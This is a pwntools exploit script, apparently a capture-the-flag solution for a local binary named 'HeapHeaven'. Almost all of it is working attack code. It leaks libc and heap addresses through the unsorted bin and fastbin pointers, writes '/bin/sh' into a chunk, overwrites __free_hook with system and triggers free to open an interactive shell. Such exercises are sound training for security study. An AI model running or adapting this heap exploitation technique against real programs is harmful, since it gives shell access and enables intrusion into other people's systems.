from pwn import *

context.log_level = 'debug'

file = "./HeapHeaven"

libc = ELF("/lib/x86_64-linux-gnu/libc.so.6")
bin = ELF(file)

conn = process(file)
#conn = gdb.debug(file)

def get_num(n):
    s = ""
    while n != 0:
        if n % 2 != 0:
            s = "wi" + s
            n = (n-1)/2
        else:
            s = "wa" + s
            n /= 2
    s = s.ljust(128, "\x00")
    return s

def malloc(size):
    conn.recvuntil("NOM-NOM\n")
    conn.sendline("whaa!")
    conn.recvuntil("ing...\n");
    conn.sendline(get_num(size))

def display(offset):
    conn.recvuntil("NOM-NOM\n")
    conn.sendline("mommy?")
    conn.sendline(get_num(offset))
    conn.recvuntil(": ")
    return conn.recvline()[:-1]

def spill(offset, str):
    conn.recvuntil("NOM-NOM\n")
    conn.sendline("<spill>")
    conn.recvuntil("doing?\n")
    conn.sendline(get_num(offset))
    conn.recvuntil("ing!\n")
    conn.sendline(str)

def free(offset):
    conn.recvuntil("NOM-NOM\n")
    conn.sendline("NOM-NOM")
    conn.sendline(get_num(offset))

# Leaking libc address for base of unsorted bin
# Initially: 0
malloc(0x10) # 0 16
malloc(400) # 0 16 400
malloc(0x10) # 0 16 400 16
free(0x40) # 0 16 [400] 16
malloc(400) # 0 16 400 16

usort_addr = u64(display(0x40)[0:6] + "\x00\x00")
system_addr = 0x7f51f26fe390 - 0x007f51f2a7db78 + usort_addr
free_hook_addr = system_addr - libc.symbols['system'] \
                 + libc.symbols['__free_hook']

# Let's leak heap's address, free the fastbins and see fd pointer
free(0x20) # 0 [16] 400 16
free(0x1e0) # 0 [16] 400 [16]

str = display(0x1e0)[0:6]
log.info(str.encode('hex'))

log.info(len(str))
happ_addr = u64(str + "\x00\x00") - 0x10

log.info("Heap_addr: " + p64(happ_addr)[::-1].encode('hex'))

offset_free_hook = free_hook_addr - happ_addr

spill(0, "/bin/sh")
spill(offset_free_hook, p64(system_addr))
free(0)

conn.interactive()

